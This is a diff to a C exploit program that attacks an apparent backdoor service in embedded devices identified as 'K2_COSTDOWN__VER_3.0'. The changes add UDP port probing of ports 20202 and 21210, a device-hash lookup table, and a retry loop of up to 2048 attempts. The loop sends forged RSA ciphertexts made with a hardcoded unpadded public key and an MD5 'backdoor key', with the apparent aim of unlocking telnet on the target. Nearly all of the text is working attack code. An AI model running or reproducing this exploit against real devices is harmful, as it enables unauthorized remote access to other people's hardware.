@@ -18,6 +18,7 @@
 #define TELNET_PORT 23
 #define PLAINTEXT_LENGTH 0x20
 #define CIPHERTEXT_LENGTH 0x80
+#define MAX_TRIES 2048
 
 #define NO_FLAGS 0
 #define WIPE() { memset(plaintext, 0, PLAINTEXT_LENGTH+1); memset(ciphertext, 0, CIPHERTEXT_LENGTH); }
@@ -68,21 +69,21 @@ int md5raw(unsigned char *out, const unsigned char *in, int len) {
   return 0;
 }
 
-unsigned char *device_identifying_hash() {
+unsigned char *device_identifying_hash(const char *identifier) {
   unsigned char buffer[0x80];
   unsigned char *hash;
   hash = calloc(16, sizeof(char));
   memset(buffer, 0, 0x80);
-  strcpy((char *) buffer, DEVICE_IDENTIFIER);
+  strcpy((char *) buffer, identifier);
   md5raw(hash, (const unsigned char *) buffer, 0x80);
   return hash;
 }
 
 ////// RSA stuff
 
-#define HARDCODED_n  "E541A631680C453DF31591A6E29382BC5EAC969DCFDBBCEA64CB49CBE36578845C507BF5E7A6BCD724AFA7063CA754826E8D13DBA18A2359EB54B5BE3368158824EA316A495DDC3059C478B41ABF6B388451D38F3C6650CDB4590C1208B91F688D0393241898C1F05A6D500C7066298C6BA2EF310F6DB2E7AF52829E9F858691"
+#define K2G_HARDCODED_n  "E541A631680C453DF31591A6E29382BC5EAC969DCFDBBCEA64CB49CBE36578845C507BF5E7A6BCD724AFA7063CA754826E8D13DBA18A2359EB54B5BE3368158824EA316A495DDC3059C478B41ABF6B388451D38F3C6650CDB4590C1208B91F688D0393241898C1F05A6D500C7066298C6BA2EF310F6DB2E7AF52829E9F858691"
 
-#define HARDCODED_e 0x10001
+#define K2G_HARDCODED_e 0x10001
 
 
 RSA *init_rsa() {
@@ -92,8 +93,8 @@ RSA *init_rsa() {
   rsa = RSA_new();
   n = BN_new();
   e = BN_new();
-  BN_set_word(e, HARDCODED_e);
-  BN_hex2bn(&n,  HARDCODED_n);
+  BN_set_word(e, K2G_HARDCODED_e);
+  BN_hex2bn(&n,  K2G_HARDCODED_n);
   rsa->e = e;
   rsa->n = n;
   return rsa;
@@ -192,9 +193,7 @@ int test() {
 
 
 
-
-
-//// UDP Stuff
+//// Network code
 
 
 int communicate(char *ip_addr, 
@@ -207,6 +206,7 @@ int communicate(char *ip_addr,
 
   int sockfd;
   unsigned int n, len;
+  n = 0;
 
   struct sockaddr_in server_addr;
 
@@ -221,14 +221,7 @@ int communicate(char *ip_addr,
   server_addr.sin_family = AF_INET;
   server_addr.sin_addr.s_addr = inet_addr(ip_addr);
   server_addr.sin_port = htons(port);
-  /*
-  printf("[-] Binding to address %s on port %d\n", ip_addr, port);
-  if (0 > bind(sockfd, (struct sockaddr*)&server_addr, sizeof(server_addr))) {
-    puts("Bind fail!");
-    close(sockfd);
-    exit(1);
-  }
-*/
+  
   printf("[-] Sending message to %s on UDP port %d:\n", ip_addr, port);
   hexdump(msg, msg_len);
 
@@ -240,7 +233,7 @@ int communicate(char *ip_addr,
 
   if (resp_len) {
     printf("[-] Expecting %d bytes in reply...\n", resp_len);
-    n = recvfrom(sockfd, resp, resp_len, MSG_WAITALL,
+    n = recvfrom(sockfd, resp, resp_len, 0,
         (struct sockaddr *) &server_addr,
         &len);
     printf("[-] Received %d bytes in reply:\n", n);
@@ -249,7 +242,7 @@ int communicate(char *ip_addr,
 
   close(sockfd);
 
-  return 0;
+  return n;
 }
 
 
@@ -257,6 +250,7 @@ int communicate(char *ip_addr,
 int check_tcp_port(char *ip_addr, int port) {
   int sockfd;
 
+  printf("[?] Checking TCP port %d on %s...\n", port, ip_addr);
   sockfd = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
   if(sockfd == -1){
     puts("[x] Failed to create socket. Fatal.");
@@ -270,17 +264,168 @@ int check_tcp_port(char *ip_addr, int port) {
   server_addr.sin_addr.s_addr = inet_addr(ip_addr);
   server_addr.sin_port = htons(port);
   if (connect(sockfd,(struct sockaddr *) &server_addr,sizeof(server_addr)) < 0) {
-    printf("[x] Port %d on %s is closed.\n", port, ip_addr);
+    printf("[x] TCP port %d on %s is closed.\n", port, ip_addr);
     close(sockfd);
     return 0;
   } else {
-    printf("[!] Port %d on %s is open.\n", port, ip_addr);
+    printf("[!] TCP port %d on %s is open.\n", port, ip_addr);
     close(sockfd);
     return 1;
   }
 }
 
 
+struct DeviceList {
+  unsigned char *hash;
+  const char *identifier;
+  const char *public_n;
+  int public_e;
+  struct DeviceList *next;
+};
+
+
+struct DeviceList * add_entry_to_device_list(struct DeviceList *DL, 
+    const char *identifier,
+    const char *public_n,
+    int public_e) {
+  struct DeviceList * node;
+  node = DL;
+
+  unsigned char buffer[0x80];
+  memset(buffer, 0, 0x80);
+  
+  if (node->identifier != NULL) {
+    // first, find the end of the list:
+    for (node = DL; node->next != NULL; node = node->next) {
+      if (!strcmp(node->identifier, identifier)) {
+        printf("[-] %s already appears in device list.\n", identifier);
+        return node;
+      }
+    }
+
+    // The empty cell is now at node->next
+    node->next = malloc(sizeof(struct DeviceList));
+    memset(node->next, 0, sizeof(struct DeviceList));
+    node = node->next;
+  }
+
+  node->identifier = strdup(identifier);
+  node->hash = device_identifying_hash(identifier);
+  node->public_n = strdup(public_n);
+  node->public_e = public_e;
+
+  printf("[+] Added device to list:\n"
+      "    - identifier: %s\n"
+      "    - public_n: 0x%s\n"
+      "    - public_e 0x%X\n"
+      "    - hash:\n",
+      identifier,
+      public_n,
+      public_e);
+  hexdump(node->hash, 16);
+
+  return node;
+}
+
+
+struct DeviceList * lookup_device_hash(struct DeviceList *DL, unsigned char *hash) {
+  struct DeviceList *node; 
+  node = DL;  
+  for (node = DL; node != NULL; node = node->next) {
+    if (!memcmp(hash, node->hash, 16)) {
+      printf("[+] Found matching hash. Identifier: %s\n", node->identifier);
+      return node;
+    }
+  }
+  return NULL;
+}
+
+
+struct DeviceList * init_device_list() {
+  struct DeviceList *DL;
+  DL = (struct DeviceList *) malloc(sizeof(struct DeviceList));
+  memset(DL, 0, sizeof(struct DeviceList));
+
+  /** TODO: Build this device list. We only have one example for now,
+   * so we can leave this for later. But I'd like to set it up eventually.
+   */
+
+  add_entry_to_device_list(DL,
+    "K2_COSTDOWN__VER_3.0",
+    K2G_HARDCODED_n,
+    K2G_HARDCODED_e);
+
+  return DL;
+}
+
+
+
+struct DeviceList * probe_udp_port(struct DeviceList *DL, 
+    char *ip_addr, 
+    int port, 
+    unsigned char *token, 
+    int token_len) {
+  int n;
+  unsigned int len;
+  unsigned char buffer[0x80];
+  struct DeviceList *device_info;
+
+  memset(buffer, 0, 0x80);
+  
+  int sockfd, res;
+  struct sockaddr_in server_addr;
+  memset(&server_addr,0,sizeof(struct sockaddr_in));
+
+  sockfd = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP);
+
+  // Set address information
+  server_addr.sin_family = AF_INET;
+  server_addr.sin_addr.s_addr = inet_addr(ip_addr);
+  server_addr.sin_port = htons(port);
+  
+  printf("[-] Probing UDP port %d on %s...\n", port, ip_addr);
+  //hexdump(token, token_len);
+
+  res = sendto(sockfd, (const char*) token, token_len, NO_FLAGS, 
+      (const struct sockaddr *) &server_addr,
+      sizeof(server_addr));
+
+  sleep(1);
+
+  if (res < 0) {
+    printf("[x] sendto() failed.\n");
+    return NULL;
+  }
+
+  n = recvfrom(sockfd, buffer, 1, MSG_PEEK|MSG_DONTWAIT,
+      (struct sockaddr *) &server_addr,
+      &len);
+
+  if (n < 1) {
+    printf("[-] no response on port %d\n", port);
+    return NULL;
+  }
+
+  printf("[+] response incoming...\n");
+
+  memset(buffer, 0, 0x80);
+
+  n = recvfrom(sockfd, buffer, 16, MSG_WAITALL,
+      (struct sockaddr *) &server_addr,
+      &len);
+  printf("[+] Received %d bytes in reply to token on UDP port %d:\n", n, port);
+  hexdump(buffer, n);
+  if (n == 16) {
+    device_info = lookup_device_hash(DL, buffer);
+    return device_info;
+  }
+
+  close(sockfd);
+
+  return NULL; 
+}
+
+//// Exploit
 
 unsigned char *find_phony_ciphertext(RSA *rsa) {
   unsigned char *phony_ciphertext;
@@ -359,14 +504,21 @@ int main(int argc, char **argv) {
   const char *magic_salt = "+TEMP";
   unsigned char *id;
   unsigned char buffer[CIPHERTEXT_LENGTH];
-  int tries = 1000;
+  int tries = MAX_TRIES;
   int tries_left = tries;
   char *telnet_command;
   struct timeval timecheck;
   long int start;
   long int elapsed;
+  int number_of_ports_to_scan = 2;
+  int ports_to_scan[2] = {
+    20202,
+    21210
+  };
+  int i;
+  int backdoor_port;
 
-  printf("[+] Initializing RSA Cipher with:\n    - hardcoded e: 0x%X\n    - hardcoded n: 0x%s\n    - no padding\n", HARDCODED_e, HARDCODED_n);
+  printf("[+] Initializing RSA Cipher with:\n    - hardcoded e: 0x%X\n    - hardcoded n: 0x%s\n    - no padding\n", K2G_HARDCODED_e, K2G_HARDCODED_n);
 
   rsa = init_rsa();
   telnet_command = malloc(0x80 * sizeof(char));
@@ -382,6 +534,31 @@ int main(int argc, char **argv) {
   gettimeofday(&timecheck, NULL);
   start = (long)timecheck.tv_sec * 1000 + (long)timecheck.tv_usec / 1000;
 
+  struct DeviceList *device_list;
+  struct DeviceList *device_info;
+
+  device_list = init_device_list();
+
+  // Port scan
+  for (i = 0; i < number_of_ports_to_scan; i++) {
+    backdoor_port = ports_to_scan[i];
+    device_info = probe_udp_port(device_list, 
+        ip_addr, backdoor_port, 
+        (unsigned char *) handshake_token, 
+        strlen((char *) handshake_token)); 
+    if (device_info != NULL) {
+      break;
+    }
+  }
+
+  if (device_info == NULL) {
+    printf("[x] Failed to solicit identifying handshake on the following ports:\n");
+    for (i = 0; i < number_of_ports_to_scan; i++) {
+      printf("    - %d\n", ports_to_scan[i]);
+    }
+    exit(1);
+  }
+
   do {
     tries_left -= 1;
     bar('=');
@@ -389,7 +566,7 @@ int main(int argc, char **argv) {
     bar('=');
     printf("[+] Sending handshake token: %s\n", handshake_token);
     printf("[-] Waiting for device identifying hash...\n");
-    communicate(ip_addr, BACKDOOR_PORT,
+    communicate(ip_addr, backdoor_port,
         (unsigned char *) handshake_token,
         strlen((char *) handshake_token),
         buffer,
@@ -398,7 +575,7 @@ int main(int argc, char **argv) {
     hexdump(buffer, 16);
 
     // not strictly necessary, but I like to make sure everything's in order
-    id = device_identifying_hash();
+    id = device_identifying_hash(DEVICE_IDENTIFIER);
     if (0 != memcmp(id, buffer, 16)) {
       printf("[x] Discrepancy in device identifying hash. Expected:\n");
       hexdump(id, 16);
@@ -414,7 +591,7 @@ int main(int argc, char **argv) {
     bar('=');
     memset(buffer, 0, CIPHERTEXT_LENGTH);
     phony_ciphertext = find_phony_ciphertext(rsa);  
-    communicate(ip_addr, BACKDOOR_PORT,
+    communicate(ip_addr, backdoor_port,
         phony_ciphertext,
         0x20,
         buffer,
@@ -428,7 +605,7 @@ int main(int argc, char **argv) {
     printf("[+] Sending MD5('%s') and hoping for collision...\n",
         (char *) magic_salt);
     md5raw(backdoor_key, (unsigned char *) magic_salt, strlen(magic_salt));
-    communicate(ip_addr, BACKDOOR_PORT,
+    communicate(ip_addr, backdoor_port,
         backdoor_key,
         0x10,
         buffer,
